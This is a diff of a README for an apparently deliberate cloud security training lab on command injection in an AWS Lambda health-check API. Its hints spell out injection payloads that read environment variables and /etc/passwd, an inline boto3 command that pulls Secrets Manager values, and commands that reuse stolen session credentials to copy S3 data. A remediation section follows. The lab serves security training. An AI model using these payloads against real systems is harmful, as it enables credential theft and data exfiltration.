@@ -1,8 +1,14 @@
-# Lambda Code Injection Lab
+# Lambda Code Injection
 
 **Difficulty:** medium  
-**Description:** Exploit command injection in a Lambda function to steal credentials and exfiltrate data  
+**Description:** Exploit command injection in Lambda to steal credentials and exfiltrate S3 data  
 **Estimated Time:** 60-90 minutes
+
+## Overview
+
+Serverless health check API built with API Gateway and Lambda. Python function performs ping operations against user-supplied hostnames. Exposed publicly for testing purposes.
+
+The function has access to AWS Secrets Manager and S3 buckets containing sensitive customer data.
 
 ## Learning Objectives
 
@@ -15,203 +21,156 @@
 
 ## Scenario
 
-Your target organization has deployed a serverless health check API that allows internal services to verify connectivity to external systems. The API is built using API Gateway and Lambda, with a Python function that performs basic ping operations.
+Internal services use a health check API to verify connectivity to external systems. The API accepts JSON payloads with a hostname parameter and returns ping results.
 
-During reconnaissance, you discover an API endpoint at `/healthcheck` that accepts JSON payloads. The service is intended to be used internally but is exposed publicly for testing purposes.
+Your goal is to exploit command injection in the Lambda function, extract temporary credentials, access Secrets Manager to find database credentials, and exfiltrate customer data from S3.
 
-Your objective is to compromise the Lambda function, steal credentials, and exfiltrate sensitive customer data from the company's S3 storage.
+## Architecture
 
-## Prerequisites
+- API Gateway endpoint at `/healthcheck`
+- Lambda function with Python 3.13 runtime
+- IAM execution role with Secrets Manager and S3 permissions
+- S3 bucket containing confidential customer database
+- Secrets Manager storing database credentials and S3 paths
 
-- AWS CLI configured with access to your lab account
-- `curl` or similar HTTP client
-- `jq` for JSON parsing
-- Basic knowledge of:
-  - Command injection techniques
-  - AWS Lambda execution model
-  - AWS IAM roles and policies
-  - AWS Secrets Manager
-  - S3 bucket operations
+## Attack Surface
 
-## Lab Deployment
-
+**API Endpoint:**
 ```bash
-# Deploy the lab
-vault deploy aws/lambda-injection
+POST /healthcheck
+Content-Type: application/json
 
-# Retrieve API endpoint
-vault outputs aws/lambda-injection
-
-# Test basic connectivity
-curl -X POST <API_ENDPOINT> \
-  -H "Content-Type: application/json" \
-  -d '{"hostname": "example.com"}'
+{"hostname": "example.com"}
 ```
 
-## Attack Chain Overview
-
-1. **Reconnaissance**
-   - Test API endpoint functionality
-   - Identify input parameters and expected behavior
-   - Look for error messages or verbose responses
-
-2. **Vulnerability Discovery**
-   - Test for command injection in the `hostname` parameter
-   - Identify command execution context
-   - Determine available commands and tools
-
-3. **Credential Extraction**
-   - Enumerate Lambda environment variables
-   - Locate AWS credential information
-   - Identify IAM role and permissions
-
-4. **Secrets Manager Access**
-   - Use Lambda's IAM credentials to access Secrets Manager
-   - Enumerate available secrets
-   - Retrieve database credentials and configuration
-
-5. **Data Exfiltration**
-   - Parse secrets for S3 bucket information
-   - Use stolen credentials to access S3
-   - Download confidential customer data
+**Available from outputs:**
+- API Gateway endpoint URL
+- Lambda function name
+- IAM execution role ARN
 
 ## Key Concepts
+
+### Command Injection in Python
+
+Function uses `subprocess.run()` with `shell=True`, enabling shell metacharacter exploitation:
+- `;` - Command separator
+- `&&` - Conditional execution (success)
+- `||` - Conditional execution (failure)
+- `|` - Pipe output
 
 ### Lambda Execution Environment
 
 Lambda functions run with:
-- Temporary AWS credentials via IAM role
-- Environment variables (often containing sensitive data)
-- Access to AWS SDK (boto3 for Python)
-- Limited execution time (default 3-10 seconds)
+- Temporary IAM credentials (automatic via execution role)
+- Environment variables containing config and secrets
+- AWS SDK (boto3) pre-installed
+- Execution timeout (3-10 seconds typical)
+- Limited output size via API Gateway
 
-### Command Injection in Lambda
+### Lambda Credential Access
 
-The vulnerable function uses `subprocess.run()` with `shell=True`, allowing command concatenation via shell metacharacters:
-- `;` - Command separator
-- `&&` - Execute if previous succeeds
-- `||` - Execute if previous fails
-- `|` - Pipe output to next command
-
-### AWS Credential Priority
-
-Lambda credentials are available via:
-1. Environment variables (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`)
-2. IMDSv2 endpoint (not available in Lambda)
-3. Task IAM role (automatic via SDK)
+Credentials available through:
+- Environment variables: `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`
+- Automatic via boto3 SDK
+- No IMDS endpoint (unlike EC2)
 
 ### Secrets Manager Structure
 
-Secrets Manager stores JSON-formatted secrets with:
+Secrets stored as JSON with:
 - Secret name (identifier)
-- Secret ARN (full resource path)
-- Secret value (JSON string)
-- Metadata (description, tags, rotation config)
-
-## Common Pitfalls
-
-- **Timing out**: Lambda functions have execution time limits. Use efficient commands.
-- **Output truncation**: API Gateway limits response size. Pipe commands carefully.
-- **URL encoding**: Special characters may need encoding in JSON payloads.
-- **Credential expiration**: Lambda credentials are temporary and expire after session ends.
+- Secret value (JSON string containing credentials/config)
+- Metadata (ARN, description, rotation settings)
 
 ## Hints
 
 <details>
-<summary>Hint 1: Testing for Command Injection</summary>
+<summary>Hint 1: Testing for Injection</summary>
 
-Try appending common shell operators to the hostname parameter:
+Test shell operators appended to hostname:
 ```json
 {"hostname": "example.com; whoami"}
 {"hostname": "example.com && env"}
-{"hostname": "example.com | cat /etc/passwd"}
+{"hostname": "example.com | cat /proc/self/environ"}
 ```
 </details>
 
 <details>
-<summary>Hint 2: Finding Credentials</summary>
+<summary>Hint 2: Credential Extraction</summary>
 
-Lambda functions have environment variables that may contain:
+Lambda environment variables contain:
 - `AWS_ACCESS_KEY_ID`
 - `AWS_SECRET_ACCESS_KEY`
 - `AWS_SESSION_TOKEN`
-- Custom variables (like `DB_SECRET_NAME`)
+- Custom variables (check for `SECRET_NAME`, `DB_SECRET`, etc.)
 
-Use `env` or `printenv` to list all environment variables.
+Use `env` or `printenv` to enumerate all variables.
 </details>
 
 <details>
 <summary>Hint 3: Accessing Secrets Manager</summary>
 
-The AWS CLI can be called from within Lambda if available. Alternatively:
-- Use the boto3 library via Python
-- Call `aws secretsmanager get-secret-value --secret-id <name>`
-- Look for environment variables that reference secret names
+Lambda includes boto3 by default. Execute Python inline:
+```bash
+; python3 -c "import boto3; print(boto3.client('secretsmanager').get_secret_value(SecretId='SECRET_NAME'))"
+```
+
+Or check if AWS CLI is available in the Lambda layer.
 </details>
 
 <details>
-<summary>Hint 4: Exfiltrating Data</summary>
+<summary>Hint 4: Exfiltration</summary>
 
-Once you have credentials and know the S3 bucket:
-- Configure AWS CLI with stolen credentials locally
-- Use `aws s3 ls` to list bucket contents
-- Use `aws s3 cp` to download files
-- Check secrets for paths to sensitive data
+Use extracted credentials locally:
+```bash
+export AWS_ACCESS_KEY_ID=<key>
+export AWS_SECRET_ACCESS_KEY=<secret>
+export AWS_SESSION_TOKEN=<token>
+
+aws s3 ls
+aws s3 cp s3://bucket/path/file.csv .
+```
 </details>
 
 ## Success Criteria
 
-You have successfully completed the lab when you:
+✓ Identify command injection vulnerability  
+✓ Extract Lambda execution role credentials  
+✓ Enumerate environment variables for secret names  
+✓ Retrieve database credentials from Secrets Manager  
+✓ Locate S3 bucket containing customer data  
+✓ Download and read confidential customer database  
+✓ Capture the flag from customer records
 
-1. ✓ Identified command injection vulnerability in the Lambda function
-2. ✓ Extracted AWS credentials from the execution environment
-3. ✓ Retrieved database credentials from Secrets Manager
-4. ✓ Located the S3 bucket containing customer data
-5. ✓ Downloaded and read the confidential customer database file
-6. ✓ Captured the flag from the customer data
+## Common Pitfalls
+
+- Lambda execution timeout - keep commands efficient
+- API Gateway response size limits - avoid large outputs
+- JSON special character encoding
+- Session token required for temporary credentials
+- Secrets Manager may require specific region configuration
 
 ## Remediation
 
-This lab demonstrates several security issues:
+**Command Injection Prevention:**
+- Never use `shell=True` with user input
+- Use parameterized commands: `subprocess.run(['ping', '-c', '1', hostname])`
+- Validate inputs with allowlists
+- Sanitize all user-supplied data
 
-1. **Command Injection**
-   - Never use `shell=True` with user input
-   - Use parameterized commands with `subprocess.run(['ping', '-c', '1', hostname])`
-   - Validate and sanitize all inputs
-   - Use allowlists for permitted hostnames/IPs
+**IAM Least Privilege:**
+- Lambda health checks don't need Secrets Manager access
+- Restrict S3 permissions to specific prefixes
+- Use resource-based policies with conditions
+- Implement permission boundaries
 
-2. **Excessive IAM Permissions**
-   - Follow principle of least privilege
-   - Lambda doesn't need Secrets Manager access for health checks
-   - Restrict S3 access to specific prefixes
-   - Use resource-based policies
+**Secrets Management:**
+- Don't expose secret names in environment variables
+- Use Parameter Store for non-sensitive config
+- Implement automatic secret rotation
+- Encrypt environment variables
 
-3. **Sensitive Data in Environment Variables**
-   - Don't expose secret names in environment variables
-   - Use AWS Systems Manager Parameter Store for non-sensitive config
-   - Implement proper secret rotation
-
-4. **API Security**
-   - Implement authentication (API keys, IAM auth, Cognito)
-   - Use WAF rules to block malicious patterns
-   - Rate limit requests to prevent abuse
-   - Enable CloudTrail logging for audit trail
-
-## Additional Resources
-
-- [AWS Lambda Security Best Practices](https://docs.aws.amazon.com/lambda/latest/dg/lambda-security.html)
-- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
-- [AWS Secrets Manager](https://docs.aws.amazon.com/secretsmanager/)
-- [Lambda Execution Role](https://docs.aws.amazon.com/lambda/latest/dg/lambda-intro-execution-role.html)
-
-## Lab Cleanup
-
-```bash
-# Destroy all lab resources
-vault destroy aws/lambda-injection
-
-# Verify cleanup
-vault status aws/lambda-injection
-```
-
-All resources are tagged with `Destroyable = true` and will be removed when you run destroy.
+**API Security:**
+- Implement authentication (API keys, IAM, Cognito)
+- Deploy WAF with injection pattern rules
+- Enable rate limiting
+- Configure CloudTrail logging for audit trails
